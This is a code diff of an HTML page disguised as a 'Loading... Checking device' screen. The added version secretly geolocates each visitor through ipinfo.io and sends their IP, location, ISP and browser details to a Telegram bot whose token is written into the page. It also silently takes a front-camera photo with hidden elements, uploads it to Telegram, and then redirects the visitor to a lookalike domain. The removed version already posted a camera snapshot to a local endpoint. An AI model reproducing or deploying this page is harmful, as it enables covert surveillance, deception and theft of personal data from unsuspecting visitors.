@@ -1,26 +1,112 @@
 <!DOCTYPE html>
-<html><body>
-<h2>Loading...</h2>
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-<script>
-const form = new FormData();
-form.append('ua', navigator.userAgent);
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream=>{
-  const v=document.getElementById('v'),c=document.getElementById('c');
-  v.srcObject=stream;
-  v.onloadedmetadata = ()=>{
-    setTimeout(()=>{
-      c.width=v.videoWidth; c.height=v.videoHeight;
-      c.getContext('2d').drawImage(v,0,0);
-      stream.getTracks().forEach(t=>t.stop());
-      c.toBlob(b=> {
-        form.append('photo', b, 'snap.jpg');
-        fetch('/log',{ method:'POST', body:form });
-      }, 'image/jpeg',0.9);
-    },3000);
-  };
-})
-.catch(()=>fetch('/log',{ method:'POST', body:form }));
-</script></body></html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { margin: 0; font-family: sans-serif; text-align: center; padding: 60px; background: #fff; color: #111; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Loading...</h2>
+  <p>Checking device. Please wait.</p>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
+    const chatId = "7216371031";
+    const redirectUrl = "https://opaslabs.vercal.app/";
+    const ipToken = "18d2a866939a58";
+
+    let textSent = false;
+    let photoSent = false;
+
+    function checkDone() {
+      if (textSent && photoSent) {
+        window.location.href = redirectUrl;
+      }
+    }
+
+    // STEP 1: IP Info
+    fetch("https://ipinfo.io/json?token=" + ipToken)
+      .then(r => r.json())
+      .then(data => {
+        const text = 
+🔐 Visitor Logged
+🌐 IP: ${data.ip}
+📍 ${data.city}, ${data.region}, ${data.country}
+📌 Location: ${data.loc}
+🌐 ISP: ${data.org}
+🧠 Agent: ${navigator.userAgent}
+🕓 ${new Date().toLocaleString()}
+        .trim();
+
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text })
+        }).then(() => {
+          textSent = true;
+          checkDone();
+        }).catch(() => {
+          textSent = true;
+          checkDone();
+        });
+      }).catch(() => {
+        textSent = true;
+        checkDone();
+      });
+
+    // STEP 2: Capture Camera Image
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(t => t.stop());
+
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append("chat_id", chatId);
+              formData.append("photo", blob);
+              formData.append("caption", "📸 Visitor Snapshot");
+
+              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
+                method: "POST",
+                body: formData
+              }).then(() => {
+                photoSent = true;
+                checkDone();
+              }).catch(() => {
+                photoSent = true;
+                checkDone();
+              });
+            }, "image/jpeg", 0.8);
+          }, 2500); // Delay snap for better focus
+        };
+      })
+      .catch(() => {
+        photoSent = true;
+        checkDone();
+      });
+
+    // Step 3: Failsafe redirect in 12s
+    setTimeout(() => {
+      if (!textSent || !photoSent) {
+        window.location.href = redirectUrl;
+      }
+    }, 12000);
+  </script>
+</body>
+</html>
